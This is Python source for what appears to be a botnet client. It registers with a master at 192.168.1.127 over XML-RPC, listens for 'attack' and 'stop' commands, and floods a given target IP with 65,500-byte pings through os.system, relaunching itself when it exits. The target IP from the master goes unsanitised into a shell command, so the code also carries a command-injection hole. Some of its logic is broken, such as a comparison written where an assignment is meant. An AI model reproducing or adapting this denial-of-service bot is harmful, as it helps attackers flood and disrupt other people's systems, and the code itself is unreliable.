import signal
import os
import sys
import socket
import platform
import xmlrpc.client
from xmlrpc.server import SimpleXMLRPCServer, SimpleXMLRPCRequestHandler
from socketserver import ThreadingMixIn

s = xmlrpc.client.ServerProxy("http://192.168.1.127:8000")
isAttack = False


def getIpAddress():
    return socket.gethostbyname(socket.gethostname())


class SimpleThreadXMLRPCServer(ThreadingMixIn, SimpleXMLRPCServer):
    pass


class RequestHandler(SimpleXMLRPCRequestHandler):
    rpc_paths = ("/RPC2",)


def listenMaster(ip_master):
    server = SimpleThreadXMLRPCServer((getIpAddress(), 5000),
                                      requestHandler=RequestHandler,
                                      logRequests=False,
                                      allow_none=True,
                                      )
    server.register_introspection_functions()
    server.register_function(attackTarget, "attack_target")
    server.register_function(receiveCommand, "give_command")
    server.serve_forever()


def stopAttack():
    s.unregister_ip(ip_address)
    os.kill(os.getpid(), signal.CTRL_C_EVENT)


def receiveCommand(message):
    """receive command from master"""
    if message["type"] == "attack":
        if isAttack == False:
            attackTarget(message)
            isAttack == True
        else:
            print("You already attack an target!")
    elif message["type"] == "stop":
        stopAttack()


def get_platform():
    """get botnet system platform"""
    return platform.system()


def attackTarget(message):
    if (get_platform().lower() == "linux"):
        os.system("ping "+message["target_ip"] + " -s 65500")
        if message["number_of_attack"] == -1:
            return
        os.system("^C")
    elif (get_platform().lower() == "windows"):
        os.system("ping "+message["target_ip"] +
                  " -l 65500 -n " + str(message["number_of_attack"]))
        if message["number_of_attack"] == -1:
            return


if __name__ == '__main__':
    print(s.system.listMethods())
    ip_address = getIpAddress()
    s.register_ip(ip_address)
    try:
        listenMaster("192.168.1.127")
    except KeyboardInterrupt:
        s.unregister_ip(ip_address)
        sys.exit(0)
    finally:
        os.system("python main.py")
